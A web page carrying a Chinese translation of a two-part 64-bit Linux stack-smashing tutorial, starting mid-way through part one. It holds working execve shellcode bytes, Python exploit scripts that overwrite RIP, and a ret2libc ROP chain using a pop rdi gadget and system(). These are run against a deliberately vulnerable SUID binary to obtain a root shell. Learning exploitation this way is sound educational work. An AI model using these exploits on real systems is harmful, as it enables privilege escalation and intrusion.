
RDX: 0x7ffff7dd5a00 --&gt; 0x0

RSI: 0x7ffff7ff5000 ("No shell for you :(\nis ", 'A' &lt;repeats 92 times&gt;"\220, \001\n")

RDI: 0x1

RBP: 0x4141414141414141 ('AAAAAAAA')

RSP: 0x7fffffffe510 ('C' &lt;repeats 200 times&gt;...)

RIP: 0x424242424242 ('BBBBBB')

R8 : 0x283a20756f792072 ('r you :(')

R9 : 0x4141414141414141 ('AAAAAAAA')

R10: 0x7fffffffe260 --&gt; 0x0

R11: 0x246

R12: 0x4004d0 (&lt;_start&gt;:    xor    ebp,ebp)

R13: 0x7fffffffe600 ('C' &lt;repeats 48 times&gt;, "|\350\377\377\377\177")

R14: 0x0

R15: 0x0

EFLAGS: 0x10246 (carry PARITY adjust ZERO sign trap INTERRUPT direction overflow)

[-------------------------------------code-------------------------------------]

Invalid $PC address: 0x424242424242

[------------------------------------stack-------------------------------------]

0000| 0x7fffffffe510 ('C' &lt;repeats 200 times&gt;...)

0008| 0x7fffffffe518 ('C' &lt;repeats 200 times&gt;...)

0016| 0x7fffffffe520 ('C' &lt;repeats 200 times&gt;...)

0024| 0x7fffffffe528 ('C' &lt;repeats 200 times&gt;...)

0032| 0x7fffffffe530 ('C' &lt;repeats 200 times&gt;...)

0040| 0x7fffffffe538 ('C' &lt;repeats 200 times&gt;...)

0048| 0x7fffffffe540 ('C' &lt;repeats 200 times&gt;...)

0056| 0x7fffffffe548 ('C' &lt;repeats 200 times&gt;...)

[------------------------------------------------------------------------------]

Legend: code, data, rodata, value

Stopped reason: SIGSEGV

0x0000424242424242 in ?? ()
</pre>
<p>很棒,我们已经彻底控制了RIP。</p>
<p>因为该程序没有NX或stack canaries保护机制，所以我们可以直接在栈上编写我们的shellcode然后返回到shellcode上。</p>
<p>让我们继续前进并完成它，我们将使用一段27字节的shellcode（执行execve(“/bin/sh”),在<a href="http://shell-storm.org/shellcode/files/shellcode-806.php">这</a>可以找到.</p>
<p>我们将通过一个环境变量把shellcode存储在栈中并用getenvaddr在栈上找到其地址.</p>
<pre>koji@pwnbox:~/classic$ export PWN=`python -c 'print "\x31\xc0\x48\xbb\xd1\x9d\x96\x91\xd0\x8c\x97\xff\x48\xf7\xdb\x53\x54\x5f\x99\x52\x57\x54\x5e\xb0\x3b\x0f\x05"'`

koji@pwnbox:~/classic$ ~/getenvaddr PWN ./classic

PWN will be at 0x7fffffffeefa
</pre>
<p>我们将更新我们的利用以在0x7fffffffeefa上返回到我们的shellcode:</p>
<pre>#!/usr/bin/env python

from struct import *

buf = ""

buf += "A"*104

buf += pack("&lt;Q", 0x7fffffffeefa)

f = open("in.txt", "w")

f.write(buf)
</pre>
<p>确保改变我们的所有权并将典例的权限改成SUID(root),因此我们可以得到我们的root shell:</p>
<pre>koji@pwnbox:~/classic$ sudo chown root classic

koji@pwnbox:~/classic$ sudo chmod 4755 classic
</pre>
<p>最后,我们将更新in.txt并将我们的payload输送进典例中:</p>
<pre>koji@pwnbox:~/classic$ python ./sploit.py

koji@pwnbox:~/classic$ (cat in.txt ; cat) | ./classic

Try to exec /bin/sh

Read 112 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAp

No shell for you :(

whoami

root
</pre>
<p>我们已得到一个root shell,因此我们已成功利用。<span style="color: #ff6600;">主要的陷阱在于我们需要留意最大的地址大小,否则我们将不能控制RIP</span>，这总结了教程的第一部分。本文由<a href="http://www.secpulse.com/archives/32328.html%20" target="_blank">安全脉搏Deily原创翻译</a>。</p>
<p>第一部分相当简单,因此在第二部分我们将使用相同的二进制程序,这次将在只开启了NX机制的情况下编译它，这将防止我们在栈上执行指令,因此到时将看到我们使用ret2libc得到root shell.敬请期待！</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<h2>0x02</h2>
<p>在第一部分中我们已利用了64位二进制文件的典型栈溢出弱点且了解到我们不能盲目期待用带有字节的buffer覆盖RIP。</p>
<p>在第一部分我们关掉了ASLR,NX,和stack canary,所以我们可以专注利用而不是绕过这些安全特性。这次我们将开启NX并看到我们可使用ret2libc的方法利用相同的二进制.</p>
<h2>搭建环境</h2>
<p>搭建的环境和第一部分中使用的环境一致.这里也将使用到如下工具:</p>
<ul>
<li><a href="https://github.com/longld/peda" target="_blank"> Python Exploit Development Assistance for GDB</a></li>
<li><a href="https://github.com/sashs/Ropper" target="_blank">Ropper</a></li>
</ul>
<h2>Ret2Libc</h2>
<p>在第一部分我们已利用相同的二进制程序.唯一不同的是我们将开启NX(让我们上次的利用失效)，因为现在栈不可执行.</p>
<pre>/* Compile: gcc -fno-stack-protector ret2libc.c -o ret2libc */
/* Disable ASLR: echo 0 &gt; /proc/sys/kerne/randomize_va_space */

#include &lt;stdio.h&gt;
#include &lt;unistd.h&gt;

int vuln() {
 char buf[80];
 int r;
 r = read(0, buf, 400);
 printf("\nRead %d bytes. buf is %s\n", r, buf);
 puts("No shell for you :(");
 return 0;
}

int main(int argc, char *argv[]) {
 printf("Try to exec /bin/sh");
 vuln();
 return 0;
}
</pre>
<p>你也可以在<a href="https://gist.github.com/superkojiman/595524f6b96c79380568" target="_blank">这</a>获取预编译好的二进制</p>
<p>在32位二进制程序中,一次ret2lib攻击(创建一个伪造栈帧),让函数可调用libc内的函数,并传递任意它需要的参数.有代表性的是这将返回到system()并让其执行“/bin/sh”.</p>
<p>在64位二进制程序中,函数参数被传递到寄存器里,因此,不需要伪造栈帧.第一次传递的6个参数依次被传递到RDI,RSI ,RDX, RCX,R8和R9.超出的任意数据都会被传递到栈.这意味着在返回到我们的函数前（libc中选定的）,我们需要确保用预期的函数参数正确配置寄存器值.如果你不熟悉ROP,不要担心,我们将不会深入讲解.</p>
<p>我们将开始于一段简明的利用(返回到system()并执行”/bin/sh”).需要一些东西:</p>
<ul>
<li>System()的地址.已关闭ASLR机制因此我们不会担心该地址的改变.</li>
<li>一个“/bin/sh”指针.</li>
<li>因第一个函数参数需要位于RDI,所以我们需要一个ROP gadget(将“/bin/sh”复制到RDI).</li>
</ul>
<p>让我们开始寻找system()的地址吧.这在GDB中很容易完成.</p>
<pre>gdb-peda$ start
.
.
.
gdb-peda$ p system
$1 = {&lt;text variable, no debug info&gt;} 0x7ffff7a5ac40 &lt;system&gt;
</pre>
<p>我们只要简单搜索一个“/bin/sh”指针.</p>
<pre>gdb-peda$ find "/bin/sh"
Searching for '/bin/sh' in: None ranges
Found 3 results, display max 3 items:
ret2libc : 0x4006ff --&gt; 0x68732f6e69622f ('/bin/sh')
ret2libc : 0x6006ff --&gt; 0x68732f6e69622f ('/bin/sh')
 libc : 0x7ffff7b9209b --&gt; 0x68732f6e69622f ('/bin/sh')
</pre>
<p>前两个指针是来自于字符串的,它位于二进制程序(打印出“Try to exec /bin/sh”).第三个指针来自libc本身,实际上,如果你确实能访问libc,请尽情使用它即可.在该情况下,我们开始执行于第一个指针(在0x4006ff上).</p>
<p>现在我们需要一个gadget(将0x4006ff复制到RDI).我们可以用ropper搜索gadget.让我们看看是否可以找到任意使用EDI或RDI的指令：</p>
<pre>koji@pwnbox:~/ret2libc$ ropper --file ret2libc --search "% ?di"
Gadgets
=======


0x0000000000400520: mov edi, 0x601050; jmp rax;
0x000000000040051f: pop rbp; mov edi, 0x601050; jmp rax;
0x00000000004006a3: pop rdi; ret ;

3 gadgets found
</pre>
<p>第三个gadget完美从栈中弹出进入RDI.我们现在已有一切构造利用的材料：</p>
<pre>#!/usr/bin/env python

from struct import *

buf = ""
buf += "A"*104 # junk
buf += pack("&lt;Q", 0x00000000004006a3) # pop rdi; ret;
buf += pack("&lt;Q", 0x4006ff) # pointer to "/bin/sh" gets popped into rdi
buf += pack("&lt;Q", 0x7ffff7a5ac40) # address of system()

f = open("in.txt", "w")
f.write(buf)
</pre>
<p>该利用将我们的payload写进in.txt（在gdb内,我们可以重定向进二进制程序）.让我们快速检查一下:</p>
<ul>
<li>行 7:用我们的ROP gadget的地址覆盖RIP,所以当vuln()返回时,它会执行pop rdi;ret.</li>
<li>行 8:当执行pop RDI时,该值会被弹进RDI.一旦完成了这些,RSP将会指向0x7ffff7a5ac40(system()的地址).</li>
<li>行 9 :在pop rdi后执行ret时,执行流会返回到system(),system()将采用RDI的参数(它预期的)并执行它.在该情况下,它执行“/bin/sh”.</li>
</ul>
<p>让我们用gdb查看它的活动.我们将在vuln()的返回指令上设置断点:</p>
<pre>gdb-peda$ br *vuln+73

Breakpoint 1 at 0x40060f
</pre>
<p>现在我们将payload重定向到二进制程序,我们的第一个断点将被击中:</p>
<pre>gdb-peda$ r &lt; in.txt

Try to exec /bin/sh

Read 128 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA�

No shell for you :(

[-------------------------------------code-------------------------------------]

0x400604 &lt;vuln+62&gt;:  call   0x400480 &lt;puts@plt&gt;

0x400609 &lt;vuln+67&gt;:  mov    eax,0x0

0x40060e &lt;vuln+72&gt;:  leave

=&gt; 0x40060f &lt;vuln+73&gt;:  ret

0x400610 &lt;main&gt;: push   rbp

0x400611 &lt;main+1&gt;:   mov    rbp,rsp

0x400614 &lt;main+4&gt;:   sub    rsp,0x10

0x400618 &lt;main+8&gt;:   mov    DWORD PTR [rbp-0x4],edi

[------------------------------------stack-------------------------------------]

0000| 0x7fffffffe508 --&gt; 0x4006a3 (&lt;__libc_csu_init+99&gt;:    pop    rdi)

0008| 0x7fffffffe510 --&gt; 0x4006ff --&gt; 0x68732f6e69622f ('/bin/sh')

0016| 0x7fffffffe518 --&gt; 0x7ffff7a5ac40 (&lt;system&gt;:  test   rdi,rdi)

0024| 0x7fffffffe520 --&gt; 0x0

0032| 0x7fffffffe528 --&gt; 0x7ffff7a37ec5 (&lt;__libc_start_main+245&gt;:   mov    edi,eax)

0040| 0x7fffffffe530 --&gt; 0x0

0048| 0x7fffffffe538 --&gt; 0x7fffffffe608 --&gt; 0x7fffffffe827 ("/home/koji/ret2libc/ret2libc")

0056| 0x7fffffffe540 --&gt; 0x100000000

[------------------------------------------------------------------------------]

Legend: code, data, rodata, value

Breakpoint 1, 0x000000000040060f in vuln ()
</pre>
<p>我们可以意识到RSP指向0x4006a3（我们的ROP gadget）.步入,同时我们将返回到我们的gadget（位于我们现在可以执行pop rdi的位置）.</p>
<pre>gdb-peda$ si
.
.
.
[-------------------------------------code-------------------------------------]
=&gt; 0x4006a3 &lt;__libc_csu_init+99&gt;: pop rdi
 0x4006a4 &lt;__libc_csu_init+100&gt;: ret
 0x4006a5: data32 nop WORD PTR cs:[rax+rax*1+0x0]
 0x4006b0 &lt;__libc_csu_fini&gt;: repz ret
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe510 --&gt; 0x4006ff --&gt; 0x68732f6e69622f ('/bin/sh')
0008| 0x7fffffffe518 --&gt; 0x7ffff7a5ac40 (&lt;system&gt;: test rdi,rdi)
0016| 0x7fffffffe520 --&gt; 0x0
0024| 0x7fffffffe528 --&gt; 0x7ffff7a37ec5 (&lt;__libc_start_main+245&gt;: mov edi,eax)
0032| 0x7fffffffe530 --&gt; 0x0
0040| 0x7fffffffe538 --&gt; 0x7fffffffe608 --&gt; 0x7fffffffe827 ("/home/koji/ret2libc/ret2libc")
0048| 0x7fffffffe540 --&gt; 0x100000000
0056| 0x7fffffffe548 --&gt; 0x400610 (&lt;main&gt;: push rbp)
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000004006a3 in __libc_csu_init ()
</pre>
<p>步入，RDI现在应该含有一个“/bin/sh”指针:</p>
<pre>gdb-peda$ si
[----------------------------------registers-----------------------------------]
.
.
.
RDI: 0x4006ff --&gt; 0x68732f6e69622f ('/bin/sh')
.
.
.
[-------------------------------------code-------------------------------------]
 0x40069e &lt;__libc_csu_init+94&gt;: pop r13
 0x4006a0 &lt;__libc_csu_init+96&gt;: pop r14
 0x4006a2 &lt;__libc_csu_init+98&gt;: pop r15
=&gt; 0x4006a4 &lt;__libc_csu_init+100&gt;: ret
 0x4006a5: data32 nop WORD PTR cs:[rax+rax*1+0x0]
 0x4006b0 &lt;__libc_csu_fini&gt;: repz ret
 0x4006b2: add BYTE PTR [rax],al
 0x4006b4 &lt;_fini&gt;: sub rsp,0x8
[------------------------------------stack-------------------------------------]
0000| 0x7fffffffe518 --&gt; 0x7ffff7a5ac40 (&lt;system&gt;: test rdi,rdi)
0008| 0x7fffffffe520 --&gt; 0x0
0016| 0x7fffffffe528 --&gt; 0x7ffff7a37ec5 (&lt;__libc_start_main+245&gt;: mov edi,eax)
0024| 0x7fffffffe530 --&gt; 0x0
0032| 0x7fffffffe538 --&gt; 0x7fffffffe608 --&gt; 0x7fffffffe827 ("/home/koji/ret2libc/ret2libc")
0040| 0x7fffffffe540 --&gt; 0x100000000
0048| 0x7fffffffe548 --&gt; 0x400610 (&lt;main&gt;: push rbp)
0056| 0x7fffffffe550 --&gt; 0x0
[------------------------------------------------------------------------------]
Legend: code, data, rodata, value
0x00000000004006a4 in __libc_csu_init ()
</pre>
<p>现在RIP指向ret且RSP指向system()的地址.再次步入,我们现在应该位于system().</p>
<pre>gdb-peda$ si
.
.
.
[-------------------------------------code-------------------------------------]
 0x7ffff7a5ac35 &lt;cancel_handler+181&gt;: pop rbx
 0x7ffff7a5ac36 &lt;cancel_handler+182&gt;: ret
 0x7ffff7a5ac37: nop WORD PTR [rax+rax*1+0x0]
=&gt; 0x7ffff7a5ac40 &lt;system&gt;: test rdi,rdi
 0x7ffff7a5ac43 &lt;system+3&gt;: je 0x7ffff7a5ac50 &lt;system+16&gt;
 0x7ffff7a5ac45 &lt;system+5&gt;: jmp 0x7ffff7a5a770 &lt;do_system&gt;
 0x7ffff7a5ac4a &lt;system+10&gt;: nop WORD PTR [rax+rax*1+0x0]
 0x7ffff7a5ac50 &lt;system+16&gt;: lea rdi,[rip+0x13744c] # 0x7ffff7b920a3
</pre>
<p>在这时，如果我们继续执行,我们应看到 “/bin/sh” 已执行</p>
<pre>gdb-peda$ c
[New process 11114]
process 11114 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
[New process 11115]
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
process 11115 is executing new program: /bin/dash
Error in re-setting breakpoint 1: No symbol table is loaded.  Use the "file" command.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
Error in re-setting breakpoint 1: No symbol "vuln" in current context.
[Inferior 3 (process 11115) exited normally]
Warning: not running or target is remote
</pre>
<p>&nbsp;</p>
<p>看来我们的利用可正常工作.让我们试试它是否可得到root shell.我们将改变ret2libc的持有者和权限让其是SUID root</p>
<pre>koji@pwnbox:~/ret2libc$ sudo chown root ret2libc

koji@pwnbox:~/ret2libc$ sudo chmod 4755 ret2libc
</pre>
<p>现在让我们像第一部分所做的那样执行我们的利用:</p>
<pre>koji@pwnbox:~/ret2libc$ (cat in.txt ; cat) | ./ret2libc

Try to exec /bin/sh

Read 128 bytes. buf is AAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAAA

AAAAAAAAAAAAAAAAAAAAAAAA�

No shell for you :(

whoami

root
</pre>
<p>再次得到我们的root shell,同时我们已绕过NX.现在这个利用相对简明(只需要一个参数).如果我们需要更多那会如何?接着在返回一个libc中的函数前,我们需要找到更多gadgets(相应地配置寄存器), 如果你想挑战自己,那么重写利用以让其调用execve()而不是system().execve()需要三个参数.</p>
<pre>int execve(const char *filename, char *const argv[], char *const envp[]);
</pre>
<p>这意味着在调用execve()函数之前,你将需要有位于RDI,RSI和RCX中的专属值.试试仅在二进制本身使用gadgets.即不在libc中寻找gadgets.好运!</p>
<p>&nbsp;</p>
<p>&nbsp;</p>
<p>【英文:<a href="http://blog.techorganic.com/2015/04/10/64-bit-linux-stack-smashing-tutorial-part-1/" target="_blank">64-bit-linux-stack-smashing-tutorial-part-1</a> &amp; <a href="http://blog.techorganic.com/2015/04/21/64-bit-linux-stack-smashing-tutorial-part-2/" target="_blank">64-bit-linux-stack-smashing-tutorial-part-2</a> 原创翻译：<a href="http://www.secpulse.com/archives/32328.html%20" target="_blank">安全脉搏Deily</a> 】</p>
		<div class="pageShenming">
【安全脉搏：分享技术、悦享品质。文章仅代表作者看法，如有不同观点，欢迎添加安全脉搏微信号：SecPulse，进行交流。】</div>
<div class="post-tags"><span>Tags: </span><a href="https://www.secpulse.com/archives/tag/0x7fffffffeefa" rel="tag">0x7fffffffeefa</a><a href="https://www.secpulse.com/archives/tag/anquanmaibo" rel="tag">anquanmaibo</a><a href="https://www.secpulse.com/archives/tag/aslr" rel="tag">ASLR</a><a href="https://www.secpulse.com/archives/tag/classic-stack-smashing" rel="tag">Classic stack smashing</a><a href="https://www.secpulse.com/archives/tag/deily" rel="tag">Deily</a><a href="https://www.secpulse.com/archives/tag/execstack" rel="tag">execstack</a><a href="https://www.secpulse.com/archives/tag/gadget" rel="tag">gadget</a><a href="https://www.secpulse.com/archives/tag/gdb" rel="tag">GDB</a><a href="https://www.secpulse.com/archives/tag/gdb-peda" rel="tag">gdb-peda</a><a href="https://www.secpulse.com/archives/tag/getenvaddr" rel="tag">getenvaddr</a><a href="https://www.secpulse.com/archives/tag/getenvaddr-c" rel="tag">getenvaddr.c</a><a href="https://www.secpulse.com/archives/tag/kojipwnbox" rel="tag">koji@pwnbox</a><a href="https://www.secpulse.com/archives/tag/nx%e6%9c%ba%e5%88%b6" rel="tag">NX机制</a><a href="https://www.secpulse.com/archives/tag/pwnbox" rel="tag">pwnbox</a><a href="https://www.secpulse.com/archives/tag/ret2libc" rel="tag">ret2libc</a><a href="https://www.secpulse.com/archives/tag/ropper" rel="tag">Ropper</a><a href="https://www.secpulse.com/archives/tag/shellcode" rel="tag">SHELLCODE</a><a href="https://www.secpulse.com/archives/tag/stack-canaries" rel="tag">stack canaries</a><a href="https://www.secpulse.com/archives/tag/vuln" rel="tag">vuln()</a><a href="https://www.secpulse.com/archives/tag/%e4%ba%8c%e8%bf%9b%e5%88%b6%e7%a8%8b%e5%ba%8f" rel="tag">二进制程序</a><a href="https://www.secpulse.com/archives/tag/%e5%ae%89%e5%85%a8%e8%84%89%e6%90%8f" rel="tag">安全脉搏</a><a href="https://www.secpulse.com/archives/tag/%e5%b4%a9%e6%a0%88%e4%be%8b%e5%ad%90" rel="tag">崩栈例子</a><a href="https://www.secpulse.com/archives/tag/%e6%8e%a7%e5%88%b6rip" rel="tag">控制RIP</a><a href="https://www.secpulse.com/archives/tag/%E7%BC%93%E5%86%B2%E5%8C%BA%E6%BA%A2%E5%87%BA" rel="tag">缓冲区溢出</a><a href="https://www.secpulse.com/archives/tag/%e8%a6%86%e7%9b%96rip" rel="tag">覆盖RIP</a><a href="https://www.secpulse.com/archives/tag/%E9%85%8D%E7%BD%AE%E9%94%99%E8%AF%AF" rel="tag">配置错误</a></div>
		</div>
	<!-- .single-content -->
		<div class="pageActive">
	<div class="mark-like-btn">
							</div>
	<!-- Baidu Button BEGIN -->
	<div class="bdshare">
		<div class="bdsharebuttonbox">
			<a href="#" class="bds_more" data-cmd="more"></a><a href="#"
				class="bds_qzone" data-cmd="qzone" title="分享到QQ空间"></a><a href="#"
				class="bds_tsina" data-cmd="tsina" title="分享到新浪微博"></a><a href="#"
				class="bds_weixin" data-cmd="weixin" title="分享到微信"></a>
		</div>
		<script>
		window._bd_share_config={"common":{"bdSnsKey":{},"bdText":"","bdMini":"2","bdMiniList":false,"bdPic":"","bdStyle":"0","bdSize":"32"},"share":{}};
		with(document)0[(getElementsByTagName('head')[0]||body).appendChild(createElement('script')).src='/static/api/js/share.js?v=89860593.js?cdnversion='+~(-new Date()/36e5)];
		</script>

	</div>
</div>    <section id="text-6" class="widget-container widget_text hidden-xs">			<div class="textwidget"><center><a href="https://www.duoyinsu.com" target="_blank" title="安识科技 专业安全服务商"><img src="https://www.secpulse.com/wp-includes/images/secweixin.png" style="width:785px;height:315px"></a><center></div>
		</section><section id="related_post-2" class="widget-container widget_related_post hidden-xs"><h3 class="widget-title">相关文章</h3>

	<ul class="related_post">
				<li><a href="https://www.secpulse.com/archives/59770.html" title="详细阅读 电商的支付风控怎么玩？">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/08/pay123.jpg&h=150&w=249&zc=1" alt="电商的支付风控怎么玩？" class="xg-img"/>
		<p>电商的支付风控怎么玩？</P></a></li>
				<li><a href="https://www.secpulse.com/archives/58840.html" title="详细阅读 至安全|web安全工程师培训招生开始！">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/06/招生红字-1024x6831.png&h=150&w=249&zc=1" alt="至安全|web安全工程师培训招生开始！" class="xg-img"/>
		<p>至安全|web安全工程师培训招生开始！</P></a></li>
				<li><a href="https://www.secpulse.com/archives/58537.html" title="详细阅读 SecPulse“脉搏涌动”第二届安全技术交流沙龙">
		 <img src="https://www.secpulse.com/wp-content/themes/sec/timthumb.php?src=https://www.secpulse.com/wp-content/uploads/2017/06/m.png&h=150&w=249&zc=1" alt="SecPulse“脉搏涌动”第二届安全技术交流沙龙" class="xg-img"/>
		<p>SecPulse“脉搏涌动”第二届安全技&hellip;</P></a></li>
			</ul>


</section></article>


<!-- 引用 -->
<div id="comments" class="comments-area">
	<h2 class="comments-title">
		抢沙发
	</h2>
			<div id="respond" class="comment-respond row">
		


			<form action="https://www.secpulse.com/wp-comments-post.php" method="post" id="commentform">
		
				
						
			<div id="comboxinfo">
					<div class="cominfodiv cominfodiv-author ">
					<p for="author" class="nicheng">
     <input type="text" name="author" id="author" class="texty" value="" tabindex="1" /> <span class="required">昵称*</span>
      </p>
</div>
					<div class="cominfodiv cominfodiv-email">
					<p for="email">	<input type="text" name="email" id="email" class="texty" value="" tabindex="2" /> <span class="required">邮箱*</span>
						</p>
					</div>
					<div class="cominfodiv cominfodiv-url">
					 	<p for="url"><input type="text" name="url" id="url" class="texty" value="" tabindex="3" /><span>网址 </span>
						</p>
					</div>
					
			
				
</div>		       <div class=" cominfodiv-nr">  
<textarea class="texty" name="w" id="comment" rows="10" tabindex="4" placeholder="输入评论内容..."></textarea><textarea name="comment" cols="100%" rows="4" style="display:none"></textarea>
							<div class="submitcom">
							
					<input id="submit" name="submit" type="submit" tabindex="5" value="提&nbsp;交"/>
					<input type='hidden' name='comment_post_ID' value='32328' id='comment_post_ID' />
<input type='hidden' name='comment_parent' id='comment_parent' value='0' />
<p style="display: none;"><input type="hidden" id="akismet_comment_nonce" name="akismet_comment_nonce" value="0c5dcaa558" /></p><p style="display: none;"><input type="hidden" id="ak_js" name="ak_js" value="202"/></p>				</div>
				<div id="cancel_comment_reply"><a rel="nofollow" id="cancel-comment-reply-link" href="/archives/32328.html#respond" style="display:none;">取消回复</a></div>
			
</div>
			
				
			</form>
			
			
			<script type="text/javascript">
				document.getElementById("comment").onkeydown = function (moz_ev){
				var ev = null;
				if (window.event){
				ev = window.event;
				}else{
				ev = moz_ev;
				}
				if (ev != null && ev.ctrlKey && ev.keyCode == 13){
				document.getElementById("submit").click();}
				}
			</script></div>
	 		
</div>
<!-- #comments --></div>
		
<div class="xs-right sidebar xs-hidden xss-hidden">
	<div class="authorbox">
	<div class="author-top">
<div id="author-img">
<img src="https://www.secpulse.com/wp-content/uploads/2014/12/b_4216_20111222020023739433835-150x150.jpg" width="96" height="96" alt="SP胖编" class="avatar avatar-96 wp-user-avatar wp-user-avatar-96 alignnone photo" />
</div>
<div class="au-name">
<a href="https://www.secpulse.com/archives/author/sp_panbian" title="由SP胖编发布" rel="author">SP胖编</a><br>
 <span class="au-title">总共60篇文章</span>
</div> </div>
	<div class="author-word"><span class="quotes q1"></span>
神器 神器 神器	<span class="quotes q2"></span></div>
	</div>
	
				<aside id="recent-posts-2" class="widget-container widget_recent_entries">		<div class="si-title"><h2>最新脉搏</h2></div>		<ul>
					<li>
				<a href="https://www.secpulse.com/archives/60653.html">《安天365安全研究》第5期</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60630.html">供应链攻击：CCleaner 5.33官方下载被植入恶意代码（附技术详解）</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60605.html">2017先知创新大会：有ZHI而来</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60576.html">甲方工作杂谈</a>
						</li>
					<li>
				<a href="https://www.secpulse.com/archives/60394.html">Catfish—缓存漏洞&#038;&#038;配合CSRF到Getshell</a>
						</li>
				</ul>
		</aside><aside id="hot_comment-3" class="widget-container widget_hot_comment"><div class="si-title"><h2>脉搏热评</h2></div>
	<ul class="hot_comment_widget">
		
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59497.html" rel="bookmark" title="XSS挑战之旅学习总结 (7条评论)" >XSS挑战之旅学习总结</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59065.html" rel="bookmark" title="web安全之如何全面发现系统后台 (6条评论)" >web安全之如何全面发现系统后台</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59770.html" rel="bookmark" title="电商的支付风控怎么玩？ (3条评论)" >电商的支付风控怎么玩？</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59466.html" rel="bookmark" title="安天移动安全联合猎豹揭秘无形之贼Dosoft免杀病毒 (2条评论)" >安天移动安全联合猎豹揭秘无形之贼Doso&hellip;</a></li>
<li><i class="fa fa-angle-right fa-1"></i><a href= "https://www.secpulse.com/archives/59262.html" rel="bookmark" title="跟着DVWA学Web安全开发 (2条评论)" >跟着DVWA学Web安全开发</a></li>			</ul>

</aside><aside id="random_post-2" class="widget-container widget_random_post"><div class="si-title"><h2>随机脉搏</h2></div>

	<ul class="random_post">
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/35180.html" rel="bookmark" title="详细阅读 用友致远A6协同系统SQL注射union可shell">用友致远A6协同系统SQL注射union可shell</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/13990.html" rel="bookmark" title="详细阅读 那些年我们一起遍历的订单之&#8212;平安保险订单泄漏">那些年我们一起遍历的订单之&#8212;平安保险订单泄漏</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/28860.html" rel="bookmark" title="详细阅读 74cms一处注入。">74cms一处注入。</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/18625.html" rel="bookmark" title="详细阅读 阿里巴巴某分站sql注入漏洞一枚">阿里巴巴某分站sql注入漏洞一枚</a></li>
		<li><i class="fa fa-angle-right fa-1"></i><a href="https://www.secpulse.com/archives/15149.html" rel="bookmark" title="详细阅读 工行某ATM沙盒绕过（未深入）">工行某ATM沙盒绕过（未深入）</a></li>
					</ul>


</aside><aside id="text-11" class="widget-container widget_text"><div class="si-title"><h2>脉搏官方微信公众号</h2></div>			<div class="textwidget"><img src="https://www.secpulse.com/wp-includes/images/SecPulse.png" width="280px" height="364px" /></div>
		</aside>				</div>
	</div>

	</section>

  <div class="inner row visible-lg-block">

	<div class="friends">
		<h3>友情链接</h3>
		<ul>
			<li><a href="https://xianzhi.aliyun.com/forum/?secpulse" target="_blank">先知安全社区</a><span>|</span></li>
			<li><a href="https://threathunter.org/" target="_blank">ThreatHunter社区</a><span>|</span></li>
			<li><a href="http://www.ijiandao.com/" target="_blank">网络尖刀</a><span>|</span></li>
			<li><a href="http://navisec.it/" target="_blank">NaviSec导航</a><span>|</span></li>
		    <li><a href="https://www.easyaq.com/" target="_blank">E安全</a><span>|</span></li>
			<li><a href="http://www.sec-wiki.com/" target="_blank">Sec-Wiki</a><span>|</span></li>
			<li><a href="http://www.waitalone.cn/" target="_blank">独自等待</a><span>|</span></li>
			<li><a href="http://www.shellsec.com/" target="_blank">神刀网</a><span>|</span></li>
			<li><a href="http://www.ineice.com/" target="_blank">爱内测</a><span>|</span></li>
			<li><a href="http://www.itet.cn/" target="_blank">北京ITET培训中心</a><span>|</span></li>
			<li><a href="http://www.ihonker.org/" target="_blank">中国红客联盟</a><span>|</span></li>
			<li><a href="http://www.bigniu.com/" target="_blank">比戈大牛</a><span>|</span></li>
			<li><a href="http://www.tiejiang.org/" target="_blank">铁匠运维网</a><span>|</span></li>
			<li><a href="http://www.nagain.com" target="_blank">娜迦信息</a><span>|</span></li>
			<li><a href="https://www.secsilo.com/" target="_blank">SecSilo</a><span>|</span></li>
			<li><a href="https://team.armyzer0.com" target="_blank">armyzer0</a><span>|</span></li>
			<li><a href="http://www.nosafe.org" target="_blank">NoSafe</a></li>
		</ul>
	</div>

	<div class="friends">
		<h3>合作伙伴</h3>
		<ul>
			<a href="https://www.duoyinsu.com" class="external" target="_blank">
				<img src="https://www.secpulse.com/wp-content/uploads/anshi-logo.png"
				alt="安识科技" width="150px" height="45px">
			</a>
			<a href="http://aq.163.com/module/partner.html" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/netease.jpg"
				alt="网易安全中心" width="150px" height="45px">
			</a>
			<a href="https://security.alibaba.com/" class="external"
				target="_blank"> <img
				src="https://www.secpulse.com/wp-content/uploads/asrc.jpg"
